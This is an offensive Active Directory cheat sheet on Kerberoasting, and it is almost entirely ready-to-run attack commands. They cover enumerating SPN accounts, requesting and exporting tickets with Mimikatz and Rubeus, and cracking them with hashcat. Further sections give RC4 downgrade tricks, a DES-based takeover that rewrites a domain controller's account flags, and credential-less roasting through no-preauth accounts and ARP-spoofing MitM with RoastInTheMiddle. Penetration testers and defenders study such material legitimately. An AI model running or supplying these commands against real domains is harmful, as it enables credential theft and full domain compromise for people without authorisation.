# Kerberoasting

## Find users with SPN

##### PowerView

    Get-NetUser -SPN

##### ActiveDirectory module

    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

## Request ST

    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN/<target>.domain.local"

OR Request-SPNTicket with PowerView

## Export the ticket

    Invoke-Mimikatz -Command '"kerberos::list /export"'

## Crack the ticket

    hashcat -m 13100 -a 0 ticket.kirbi /usr/share/wordlist/rockyou.txt

# Alternative Method: Rubeus

Rubeus can be used to perform all the attack, with more or less opsec

##### Kerberoast all the kerberoastable accounts

    .\Rubeus.exe kerberoast

##### Kerberoast a specified account

    .\Rubeus.exe kerberoast /user:<target> /outfile:ticket.kirbi

##### Kerberoast with RC4 downgrade even if the targets are AES enabled. Tickets are easier to crack

    .\Rubeus.exe kerberoast /tgtdeleg

##### Kerberoast with opsec tgtdeleg trick filtering AES accounts

    .\Rubeus.exe kerberoast /rc4opsec

# Kerberoast with DES

DES can be enabled in the following GPO 

    Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security 
    
on the Domain Controller, on in the following registry key : 

    HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\parameters\SupportedEncryptionTypes. 
    
DES can be use to takeover any account except krbtgt and trust accounts.

### 1) Check if DES is enabled

    ./Rubeus.exe asktgt /user:user1 /password:Password123 /domain:domain.local /dc:dc.domain.local /suppenctype:des /nowrap

##### To check in the UAC of an account

    Get-DomainUser user1 -Domain domain.local -Server dc.domain.local | select useraccountcontrol,serviceprincipalname

### 2) Request a ST fot the target SPN

    ./Rubeus.exe asktgs /ticket:TGT.kirbi /service:<target_SPN> /enctype:des /dc:dc.domain.local /nowrap

### 3) Perform a U2U request. The goal is to obtain a ticket for the user than can be decrypted to read the first block of plain text. This block will be used after to form a crackable hash. Retrieve the value of "Block One Plain Text" in the output

    ./Rubeus.exe asktgs /u2u /ticket:TGT.kirbi /tgs:TGT.kirbi /nowrap

### 4) Then, reuse this value in the /desplaintext parameter with the describe command

    ./Rubeus.exe describe /desplaintext:<plain_text> /ticket:<previous_ST>

### 5) The Kerberoast Hash value in the output can be used with hashcat:

    hashcat -a 3 -m 14000 <kerberoast_hash> -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1

The obtained DES key can now be used to ask for a TGT for the target account.

To exploit this against a Domain Controller, the DC account UAC must be changed from SERVER_TRUST_ACCOUNT (8192) needs to be changed to WORKSTATION_TRUST_ACCOUNT (4096) (Owner or Write access against the DC account are needed). This attack can be destructive. It is not recommanded to perform it in production. Additionally, DES must be activated in the UAC.

    Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=12288}
    Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=2097152}

Then, the attack can be performed as presented above. To rollback to SERVER_TRUST_ACCOUNT an admin account is needed. First escalate to DA, then:

    Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=12288}

# Kerberoast without credentials

## Without pre-authentication

If a principal can authent without pre-authentication (like AS-REP Roasting), it is possible to use it to launch an AS-REQ request (for a TGT) and trick the request to ask for a ST instead for a kerberoastable principal, by modifying the sname attribut in the req-body part of the request.

    .\Rubeus.exe kerberoast /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"user_w/o_preauth" /spn:users.txt

## With MitM

If no principal without pre-authentication are present, it is still possible to intercept the AS-REQ requests on the wire (with ARP spoofing for example), and replay them to kerberoast.

### WARNING: RoastInTheMiddle.exe is only a PoC for the moment, be carefull with it in prod environment !

    ./RoastInTheMiddle.exe /listenip:<attacker_IP> /spns:users.txt /targets:<target_IP_1>,<target_IP_2> /dcs:<DC_IP_1>,<DC_IP_2>

## Combined with DES

### Steps

1) Request a valid TGT for User1.

2) Send U2U with User1’s TGT as both authentication and additional tickets to extract known plain text of first block.

3) Man-in-the-Middle (MitM) is performed.

4) AS-REQ for Computer1 is captured.

5) AS-REQ modified to only include the DES-CBC-MD5 etype.

6) Forward AS-REQ to a DC that supports DES.

7) Extract TGT for Computer1 from AS-REP.

8) Send U2U with User1’s TGT as the authentication ticket and Computer1’s TGT as the additional ticket to get an ST encrypted with Computer1’s TGT’s session key.

9) Create a DES hash from U2U ST encrypted with Computer1’s TGT’s session key.

10) Create KERB_CRED from Computer1’s TGT and known information, missing the session key.

11) Crack the DES hash back to the TGT session key.

12) Insert the TGT session key into the KERB_CRED.

13) Use the TGT to authenticate as Computer1.

